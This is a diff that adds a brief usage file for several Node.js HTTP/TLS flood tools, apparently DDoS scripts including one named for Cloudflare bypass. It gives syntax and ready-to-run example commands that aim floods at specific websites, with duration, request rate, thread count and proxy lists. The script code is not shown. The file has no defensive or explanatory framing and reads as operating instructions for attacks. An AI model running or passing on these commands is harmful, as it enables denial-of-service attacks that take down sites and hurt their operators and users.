@@ -1,0 +1,14 @@
+gradient-string 
+
+
+Usage: TLS-4 target time rate thread proxyfile
+node TLS-4.js https://daukute.us/ 60 20 30 vn.txt
+
+Usage: node TLS-3.js URL TIME REQ_PER_SEC THREADS
+Example: node TLS-3.js https://tls.mrrage.xyz 500 8 1
+
+Usage: node Floodv5 <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>
+node Floodv5 GET https://daukute.us/ vn.txt 60 20 50
+
+Usage: node target time rate thread proxyfile
+node CF-C.js https://daukute.us/ 60 20 50 vn.txt
